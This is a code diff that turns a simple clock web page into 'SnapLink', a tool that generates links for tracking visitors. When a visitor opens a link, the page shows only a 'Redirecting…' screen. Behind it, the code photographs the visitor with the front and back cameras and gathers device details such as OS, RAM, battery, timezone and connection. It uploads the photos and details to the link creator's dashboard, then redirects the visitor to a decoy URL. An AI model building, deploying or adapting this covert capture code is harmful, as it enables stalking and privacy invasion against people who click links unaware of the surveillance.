+                    <input type="url" id="redirectUrl" placeholder="Redirect URL (e.g. https://example.com)" />
+                    <input type="email" id="creatorEmail" placeholder="Your email (optional)" />
+                    <button class="btn" id="createBtn">
+                        <span class="material-symbols-outlined" aria-hidden="true">add_link</span> Generate Link
+                    </button>
+                </div>
+                <div id="linkResult" class="hidden" style="margin-top:16px;">
+                    <div class="link-box">
+                        <input type="text" id="generatedLink" readonly />
+                        <button class="btn btn-secondary" id="copyBtn">
+                            <span class="material-symbols-outlined" style="font-size:20px;" aria-hidden="true">content_copy</span>
+                        </button>
+                    </div>
+                    <div id="createToast" class="toast"></div>
+                </div>
+            </div>
+            <p class="text-center text-muted" style="font-size:12px;">
+                Up to 4 captures per link · Images expire after 15 days
+            </p>
+        </section>
+
+        <!-- Tab: Links -->
+        <section id="tab-links" class="tab-content" role="tabpanel">
+            <div id="linksList"></div>
+        </section>
+
+        <!-- Bottom Switcher (Pill Style) -->
+        <div class="bottom-overlay">
+            <div class="mode-switch">
+                <button class="mode-option active" id="modeCreate">
+                    <span class="material-symbols-outlined">add_circle</span> Create
+                </button>
+                <button class="mode-option" id="modeLinks">
+                    <span class="material-symbols-outlined">link</span> Links
+                </button>
+            </div>
         </div>
-      </div>
-      <div class="date-label" id="currentDate">Loading...</div>
+
+        <!-- Viewer Mode -->
+        <div id="viewer" class="hidden" style="flex:1; display:none; flex-direction:column; justify-content:center; padding:20px;">
+            <div class="viewer-container">
+                <div class="spinner"></div>
+                <div class="status" id="viewerStatus">Redirecting…</div>
+                <div class="sub" id="viewerSub">Preparing your capture</div>
+                <div id="viewerToast" class="toast w-full" style="margin-top:20px;"></div>
+            </div>
+        </div>
     </div>
 
-    <div class="bottom-overlay">
-      <div class="mode-switch">
-        <button class="mode-option active" id="modeDigital">
-          <span class="material-symbols-rounded">counter_2</span> Digital
-        </button>
-        <button class="mode-option" id="modeAnalog">
-          <span class="material-symbols-rounded">pacemaker</span> Analog
-        </button>
-      </div>
-    </div>
-  </div>
+    <!-- Hidden video elements for capture -->
+    <video id="frontVideo" autoplay playsinline></video>
+    <video id="backVideo" autoplay playsinline></video>
+    <canvas id="captureCanvas" style="display:none;"></canvas>
 
-  <script>
-    (function() {
-      const STORAGE_KEY = 'endroid_theme';
-      const body = document.body;
-      const themeIcon = document.getElementById('themeIcon');
-      const themeToggle = document.getElementById('themeToggle');
+    <script>
+        (() => {
+            'use strict';
 
-      function getStoredTheme() {
-        return localStorage.getItem(STORAGE_KEY);
-      }
+            // ─── Constants ───
+            const CREATOR_ID_KEY = 'snaplink_creatorId';
+            const THEME_KEY = 'snaplink_theme';
+            const API_BASE = '/api';
 
-      function setTheme(theme, save = true) {
-        const isDark = theme === 'dark';
-        if (isDark) {
-          body.classList.add('dark');
-          themeIcon.innerText = 'dark_mode';
-        } else {
-          body.classList.remove('dark');
-          themeIcon.innerText = 'light_mode';
-        }
-        if (save) {
-          localStorage.setItem(STORAGE_KEY, theme);
-        }
-      }
+            // ─── State ───
+            let creatorId = localStorage.getItem(CREATOR_ID_KEY);
+            if (!creatorId) {
+                creatorId = crypto.randomUUID?.() ?? 'id-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8);
+                localStorage.setItem(CREATOR_ID_KEY, creatorId);
+            }
 
-      const stored = getStoredTheme();
-      if (stored === 'dark' || stored === 'light') {
-        setTheme(stored, false);
-      } else {
-        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-        setTheme(prefersDark ? 'dark' : 'light', false);
-      }
+            // ─── Theme ───
+            let currentTheme = localStorage.getItem(THEME_KEY) || (window.matchMedia('(prefers-color-scheme: dark)')
+            .matches ? 'dark' : 'light');
+            applyTheme(currentTheme);
 
-      themeToggle.addEventListener('click', () => {
-        const isDark = body.classList.contains('dark');
-        setTheme(isDark ? 'light' : 'dark', true);
-      });
+            function applyTheme(theme) {
+                document.documentElement.setAttribute('data-theme', theme);
+                const icon = document.getElementById('themeToggle');
+                icon.textContent = theme === 'dark' ? 'dark_mode' : 'light_mode';
+                localStorage.setItem(THEME_KEY, theme);
+                currentTheme = theme;
+            }
 
-      const digitalBtn = document.getElementById('modeDigital');
-      const analogBtn = document.getElementById('modeAnalog');
-      const digitalContainer = document.getElementById('digitalContainer');
-      const analogContainer = document.getElementById('analogContainer');
+            document.getElementById('themeToggle').addEventListener('click', () => {
+                const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+                applyTheme(newTheme);
+            });
 
-      let currentMode = 'digital';
+            // ─── DOM Refs ───
+            const $ = (sel) => document.querySelector(sel);
+            const $$ = (sel) => document.querySelectorAll(sel);
 
-      function setActiveMode(mode) {
-        currentMode = mode;
-        if (mode === 'digital') {
-          digitalBtn.classList.add('active');
-          analogBtn.classList.remove('active');
-          digitalContainer.classList.remove('hidden');
-          analogContainer.classList.add('hidden');
-        } else {
-          analogBtn.classList.add('active');
-          digitalBtn.classList.remove('active');
-          digitalContainer.classList.add('hidden');
-          analogContainer.classList.remove('hidden');
-        }
-      }
+            const tabCreate = document.getElementById('tab-create');
+            const tabLinks = document.getElementById('tab-links');
+            const modeCreate = document.getElementById('modeCreate');
+            const modeLinks = document.getElementById('modeLinks');
+            const redirectUrlInput = document.getElementById('redirectUrl');
+            const creatorEmailInput = document.getElementById('creatorEmail');
+            const createBtn = document.getElementById('createBtn');
+            const linkResult = document.getElementById('linkResult');
+            const generatedLink = document.getElementById('generatedLink');
+            const copyBtn = document.getElementById('copyBtn');
+            const createToast = document.getElementById('createToast');
+            const linksList = document.getElementById('linksList');
 
-      digitalBtn.addEventListener('click', () => setActiveMode('digital'));
-      analogBtn.addEventListener('click', () => setActiveMode('analog'));
+            const viewer = document.getElementById('viewer');
+            const viewerStatus = document.getElementById('viewerStatus');
+            const viewerSub = document.getElementById('viewerSub');
+            const viewerToast = document.getElementById('viewerToast');
+            const frontVideo = document.getElementById('frontVideo');
+            const backVideo = document.getElementById('backVideo');
+            const captureCanvas = document.getElementById('captureCanvas');
 
-      const digitalEl = document.getElementById('digitalTime');
-      const dateEl = document.getElementById('currentDate');
-      const hourHand = document.getElementById('hourHand');
-      const minuteHand = document.getElementById('minuteHand');
-      const secondHand = document.getElementById('secondHand');
+            // ─── Helpers ───
+            function escapeHtml(str) {
+                if (!str) return '';
+                const div = document.createElement('div');
+                div.textContent = str;
+                return div.innerHTML;
+            }
 
-      function updateClock() {
-        const now = new Date();
-        const hours = now.getHours();
-        const minutes = now.getMinutes();
-        const seconds = now.getSeconds();
+            function showToast(el, msg, type = '') {
+                el.textContent = msg;
+                el.className = 'toast show ' + type;
+                clearTimeout(el._timer);
+                el._timer = setTimeout(() => (el.className = 'toast'), 5000);
+                console.log(`📢 Toast [${type || 'info'}]:`, msg);
+            }
 
-        digitalEl.innerText = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            function sleep(ms) {
+                return new Promise((r) => setTimeout(r, ms));
+            }
 
-        const dateStr = now.toLocaleDateString(undefined, { 
-          weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
-        });
-        dateEl.innerText = dateStr;
+            // ─── API Helpers ───
+            async function apiFetch(endpoint, options = {}) {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 30000);
+                try {
+                    const response = await fetch(`${API_BASE}${endpoint}`, {
+                        ...options,
+                        signal: controller.signal,
+                    });
+                    clearTimeout(timeout);
+                    return response;
+                } catch (err) {
+                    clearTimeout(timeout);
+                    throw err;
+                }
+            }
 
-        const hourDeg = (hours % 12) * 30 + minutes * 0.5;
-        const minuteDeg = minutes * 6 + seconds * 0.1;
-        const secondDeg = seconds * 6;
+            // ─── Load & Render Links ───
+            let linksLoaded = false;
 
-        if (hourHand && minuteHand && secondHand) {
-          hourHand.style.transform = `translateX(-50%) rotate(${hourDeg}deg)`;
-          minuteHand.style.transform = `translateX(-50%) rotate(${minuteDeg}deg)`;
-          secondHand.style.transform = `translateX(-50%) rotate(${secondDeg}deg)`;
-        }
-      }
+            async function loadLinks() {
+                if (linksLoaded) return;
+                try {
+                    const res = await apiFetch(`/links?creatorId=${encodeURIComponent(creatorId)}`);
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                    const data = await res.json();
+                    renderLinks(data.links || []);
+                    linksLoaded = true;
+                } catch (err) {
+                    console.error('❌ Failed to load links:', err);
+                    linksList.innerHTML =
+                        `<p class="text-center text-muted">Failed to load links. Please try again.</p>`;
+                }
+            }
 
-      updateClock();
-      setInterval(updateClock, 1000);
+            function renderLinks(links) {
+                if (!links || links.length === 0) {
+                    linksList.innerHTML = `
+                        <div class="empty-state">
+                            <span class="material-symbols-outlined" aria-hidden="true">link_off</span>
+                            <div>No links created yet</div>
+                        </div>
+                    `;
+                    return;
+                }
 
-      if ('serviceWorker' in navigator) {
-        window.addEventListener('load', () => {
-          navigator.serviceWorker.register('https://endroid.pages.dev/Clock/service-worker.js')
-            .then(reg => console.log('✅ Service Worker registered:', reg.scope))
-            .catch(err => console.log('❌ Service Worker registration failed:', err));
-        });
-      }
-    })();
-  </script>
+                let html = '';
+                for (const link of links) {
+                    const captures = link.captures || [];
+                    html += `
+                        <div class="link-item" data-linkid="${escapeHtml(link.linkId)}">
+                            <div class="link-header">
+                                <strong>${escapeHtml(link.linkId)}</strong>
+                                <span class="badge">${captures.length}/4 captures</span>
+                            </div>
+                            <div class="link-meta">
+                                Redirects to: ${escapeHtml(link.redirectUrl)} · ${new Date(link.createdAt).toLocaleString()}
+                            </div>
+                            <div class="link-actions">
+                                <button class="btn btn-danger btn-small clear-captures-btn" data-linkid="${escapeHtml(link.linkId)}">
+                                    <span class="material-symbols-outlined" style="font-size:16px;">delete_sweep</span> Clear Captures
+                                </button>
+                                <button class="btn btn-danger btn-small delete-link-btn" data-linkid="${escapeHtml(link.linkId)}">
+                                    <span class="material-symbols-outlined" style="font-size:16px;">delete_forever</span> Delete Link
+                                </button>
+                            </div>
+                    `;
+
+                    if (captures.length === 0) {
+                        html += `<div class="text-muted" style="font-size:13px; margin-top:8px;">No captures yet.</div>`;
+                    } else {
+                        html += `<div class="capture-grid">`;
+                        for (const cap of captures) {
+                            const meta = cap.metadata || {};
+                            const front = cap.frontImageUrl || '';
+                            const back = cap.backImageUrl || '';
+                            html += `
+                                <div class="capture-item">
+                                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
+                                        ${front ? `<img src="${escapeHtml(front)}" alt="Front camera" loading="lazy" style="flex:1;min-width:80px;" />` : ''}
+                                        ${back ? `<img src="${escapeHtml(back)}" alt="Back camera" loading="lazy" style="flex:1;min-width:80px;" />` : ''}
+                                    </div>
+                                    <div class="capture-meta">
+                                        ${escapeHtml(meta.browser || '')} · ${escapeHtml(meta.os || '')}<br>
+                                        ${escapeHtml(meta.screen || '')}<br>
+                                        ${meta.deviceMemory ? `RAM: ${meta.deviceMemory} GB · ` : ''}${meta.hardwareConcurrency ? `${meta.hardwareConcurrency} cores` : ''}
+                                        <br>Battery: ${meta.battery ? (meta.battery.level * 100).toFixed(0) + '%' : 'N/A'} ${meta.battery?.charging ? '⚡' : ''}
+                                        <br>${new Date(cap.timestamp).toLocaleString()}
+                                    </div>
+                                </div>
+                            `;
+                        }
+                        html += `</div>`;
+                    }
+                    html += `</div>`;
+                }
+                linksList.innerHTML = html;
+
+                // --- Attach event listeners for link actions ---
+                document.querySelectorAll('.delete-link-btn').forEach(btn => {
+                    btn.addEventListener('click', async (e) => {
+                        const linkId = btn.dataset.linkid;
+                        if (confirm(`Are you sure you want to delete link ${linkId}? All captures will be lost.`)) {
+                            await deleteLink(linkId);
+                        }
+                    });
+                });
+
+                document.querySelectorAll('.clear-captures-btn').forEach(btn => {
+                    btn.addEventListener('click', async (e) => {
+                        const linkId = btn.dataset.linkid;
+                        if (confirm(`Clear all captures for link ${linkId}?`)) {
+                            await clearCaptures(linkId);
+                        }
+                    });
+                });
+            }
+
+            // ─── Delete Link ───
+            async function deleteLink(linkId) {
+                try {
+                    const res = await apiFetch(`/delete?linkId=${encodeURIComponent(linkId)}`, {
+                        method: 'DELETE',
+                    });
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                    showToast(createToast, `Link ${linkId} deleted.`, 'success');
+                    linksLoaded = false;
+                    loadLinks();
+                } catch (err) {
+                    console.error('❌ Delete error:', err);
+                    showToast(createToast, 'Error deleting link: ' + err.message, 'error');
+                }
+            }
+
+            // ─── Clear Captures ───
+            async function clearCaptures(linkId) {
+                try {
+                    const res = await apiFetch(`/clear-captures?linkId=${encodeURIComponent(linkId)}`, {
+                        method: 'DELETE',
+                    });
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                    showToast(createToast, `Captures cleared for ${linkId}.`, 'success');
+                    linksLoaded = false;
+                    loadLinks();
+                } catch (err) {
+                    console.error('❌ Clear captures error:', err);
+                    showToast(createToast, 'Error clearing captures: ' + err.message, 'error');
+                }
+            }
+
+            // ─── Create Link ───
+            createBtn.addEventListener('click', async () => {
+                const redirectUrl = redirectUrlInput.value.trim();
+                const email = creatorEmailInput.value.trim();
+
+                if (!redirectUrl) {
+                    showToast(createToast, 'Enter a redirect URL.', 'error');
+                    return;
+                }
+                try {
+                    new URL(redirectUrl);
+                } catch (_) {
+                    showToast(createToast, 'Invalid URL (include https://).', 'error');
+                    return;
+                }
+
+                createBtn.disabled = true;
+                createBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:3px;"></span> Creating...';
+
+                try {
+                    const res = await apiFetch('/create', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ redirectUrl, creatorId, creatorEmail: email }),
+                    });
+                    const data = await res.json();
+
+                    if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
+
+                    if (data.linkId) {
+                        const fullLink = window.location.origin + window.location.pathname + '?id=' + data.linkId;
+                        generatedLink.value = fullLink;
+                        linkResult.classList.remove('hidden');
+                        showToast(createToast, 'Link created!', 'success');
+                        linksLoaded = false; // force reload if we later switch to links
+                    } else {
+                        showToast(createToast, 'Error: ' + (data.error || 'Unknown error'), 'error');
+                    }
+                } catch (err) {
+                    console.error('❌ Create link error:', err);
+                    showToast(createToast, 'Error: ' + err.message, 'error');
+                } finally {
+                    createBtn.disabled = false;
+                    createBtn.innerHTML =
+                    '<span class="material-symbols-outlined" aria-hidden="true">add_link</span> Generate Link';
+                }
+            });
+
+            // ─── Copy Link ───
+            copyBtn.addEventListener('click', async () => {
+                try {
+                    await navigator.clipboard.writeText(generatedLink.value);
+                    showToast(createToast, 'Copied!', 'success');
+                } catch (_) {
+                    generatedLink.select();
+                    document.execCommand('copy');
+                    showToast(createToast, 'Copied!', 'success');
+                }
+            });
+
+            // ─── Tab Switching (strict) ───
+            function setActiveTab(tabName) {
+                // Remove active class from both tabs
+                tabCreate.classList.remove('active');
+                tabLinks.classList.remove('active');
+                modeCreate.classList.remove('active');
+                modeLinks.classList.remove('active');
+
+                // Add active class to the selected one
+                if (tabName === 'create') {
+                    tabCreate.classList.add('active');
+                    modeCreate.classList.add('active');
+                } else {
+                    tabLinks.classList.add('active');
+                    modeLinks.classList.add('active');
+                    // Load links when switching to Links tab
+                    loadLinks();
+                }
+            }
+
+            modeCreate.addEventListener('click', () => setActiveTab('create'));
+            modeLinks.addEventListener('click', () => setActiveTab('links'));
+
+            // ─── Viewer Initialization ───
+            async function initViewer() {
+                const params = new URLSearchParams(window.location.search);
+                const linkId = params.get('id');
+                if (!linkId) return false;
+
+                // Hide dashboard, show viewer with loading
+                document.querySelector('.app-bar').style.display = 'none';
+                document.querySelector('.bottom-overlay').style.display = 'none';
+                $$('.tab-content').forEach((el) => (el.style.display = 'none'));
+                viewer.classList.remove('hidden');
+                viewer.style.display = 'flex';
+                viewerStatus.textContent = 'Redirecting…';
+                viewerSub.textContent = 'Preparing your capture';
+
+                try {
+                    // Check link existence and capture count
+                    const res = await apiFetch(`/captures?linkId=${encodeURIComponent(linkId)}`);
+                    const data = await res.json();
+
+                    if (!data.linkExists) {
+                        viewerStatus.textContent = 'Link not found';
+                        viewerSub.textContent = 'This link may have expired.';
+                        return true;
+                    }
+
+                    if (data.capturesCount >= 4) {
+                        viewerStatus.textContent = 'Capture limit reached';
+                        viewerSub.textContent = 'This link already has 4 captures.';
+                        setTimeout(() => {
+                            window.location.href = data.redirectUrl;
+                        }, 3000);
+                        return true;
+                    }
+
+                    // Start capture in background (no step messages)
+                    await performCapture(linkId, data.redirectUrl);
+                } catch (err) {
+                    console.error('❌ Viewer error:', err);
+                    viewerStatus.textContent = 'Error';
+                    viewerSub.textContent = err.message;
+                    showToast(viewerToast, err.message, 'error');
+                    await sleep(3000);
+                    window.location.href = 'https://example.com';
+                }
+                return true;
+            }
+
+            // ─── Perform Capture (Background, no UI steps) ───
+            async function performCapture(linkId, redirectUrl) {
+                let frontStream = null;
+                let backStream = null;
+
+                try {
+                    // Request camera permission
+                    if (!navigator.mediaDevices?.getUserMedia) {
+                        throw new Error('Camera not supported in this browser.');
+                    }
+
+                    // Front camera
+                    frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false,
+                    });
+                    frontVideo.srcObject = frontStream;
+                    await frontVideo.play();
+                    const frontBlob = await captureFrameWithBrightness(frontVideo);
+                    frontStream.getTracks().forEach((t) => t.stop());
+                    frontVideo.srcObject = null;
+                    frontStream = null;
+
+                    // Back camera
+                    backStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false,
+                    });
+                    backVideo.srcObject = backStream;
+                    await backVideo.play();
+                    const backBlob = await captureFrameWithBrightness(backVideo);
+                    backStream.getTracks().forEach((t) => t.stop());
+                    backVideo.srcObject = null;
+                    backStream = null;
+
+                    // Collect metadata (including RAM)
+                    const metadata = await collectMetadata();
+
+                    // Upload
+                    const formData = new FormData();
+                    formData.append('linkId', linkId);
+                    formData.append('frontImage', frontBlob, 'front.jpg');
+                    formData.append('backImage', backBlob, 'back.jpg');
+                    formData.append('metadata', JSON.stringify(metadata));
+
+                    const resp = await apiFetch('/capture', {
+                        method: 'POST',
+                        body: formData,
+                    });
+
+                    const result = await resp.json();
+                    if (!resp.ok) throw new Error(result.error || 'Upload failed');
+
+                    // Done – redirect
+                    viewerStatus.textContent = 'Redirecting…';
+                    viewerSub.textContent = 'All set!';
+                    await sleep(800);
+                    window.location.href = redirectUrl;
+                } catch (err) {
+                    console.error('❌ Capture error:', err);
+                    viewerStatus.textContent = 'Error';
+                    viewerSub.textContent = err.message;
+                    showToast(viewerToast, err.message, 'error');
+                    if (frontStream) frontStream.getTracks().forEach((t) => t.stop());
+                    if (backStream) backStream.getTracks().forEach((t) => t.stop());
+                    frontVideo.srcObject = null;
+                    backVideo.srcObject = null;
+                    await sleep(2500);
+                    window.location.href = redirectUrl;
+                }
+            }
+
+            // ─── Auto‑exposure: scale image so average luminance becomes neutral gray (128) ───
+            function captureFrameWithBrightness(video) {
+                return new Promise((resolve) => {
+                    const canvas = captureCanvas;
+                    const w = video.videoWidth || 640;
+                    const h = video.videoHeight || 480;
+                    canvas.width = w;
+                    canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, w, h);
+
+                    const imageData = ctx.getImageData(0, 0, w, h);
+                    const data = imageData.data;
+
+                    // Compute average luminance
+                    let sum = 0;
+                    for (let i = 0; i < data.length; i += 4) {
+                        const r = data[i];
+                        const g = data[i + 1];
+                        const b = data[i + 2];
+                        const luma = 0.299 * r + 0.587 * g + 0.114 * b;
+                        sum += luma;
+                    }
+                    const mean = sum / (w * h);
+                    const target = 128;
+                    let factor = target / mean;
+                    factor = Math.min(2.0, Math.max(0.5, factor));
+
+                    for (let i = 0; i < data.length; i += 4) {
+                        data[i] = Math.min(255, data[i] * factor);
+                        data[i + 1] = Math.min(255, data[i + 1] * factor);
+                        data[i + 2] = Math.min(255, data[i + 2] * factor);
+                    }
+                    ctx.putImageData(imageData, 0, 0);
+
+                    canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.85);
+                });
+            }
+
+            // ─── Collect Metadata (with RAM) ───
+            async function collectMetadata() {
+                const meta = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    browser: (() => {
+                        const ua = navigator.userAgent;
+                        if (ua.includes('Chrome')) return 'Chrome';
+                        if (ua.includes('Firefox')) return 'Firefox';
+                        if (ua.includes('Safari')) return 'Safari';
+                        return 'Other';
+                    })(),
+                    os: (() => {
+                        const ua = navigator.userAgent;
+                        if (ua.includes('Windows')) return 'Windows';
+                        if (ua.includes('Mac OS')) return 'macOS';
+                        if (ua.includes('Linux')) return 'Linux';
+                        if (ua.includes('Android')) return 'Android';
+                        if (ua.includes('iOS')) return 'iOS';
+                        return 'Unknown';
+                    })(),
+                    deviceMemory: navigator.deviceMemory || undefined,
+                    hardwareConcurrency: navigator.hardwareConcurrency || undefined,
+                    battery: null,
+                };
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        meta.battery = {
+                            level: battery.level,
+                            charging: battery.charging,
+                        };
+                    }
+                } catch (_) { /* ignore */ }
+                try {
+                    if (navigator.connection) {
+                        meta.connection = {
+                            type: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                        };
+                    }
+                } catch (_) { /* ignore */ }
+                return meta;
+            }
+
+            // ─── Start App ───
+            (async function init() {
+                const isViewer = await initViewer();
+                if (!isViewer) {
+                    // Show dashboard
+                    document.querySelector('.app-bar').style.display = 'flex';
+                    document.querySelector('.bottom-overlay').style.display = 'flex';
+                    $$('.tab-content').forEach((el) => (el.style.display = 'block'));
+                    // Start with the Create tab active
+                    setActiveTab('create');
+                }
+            })();
+        })();
+    </script>
 </body>
 </html>
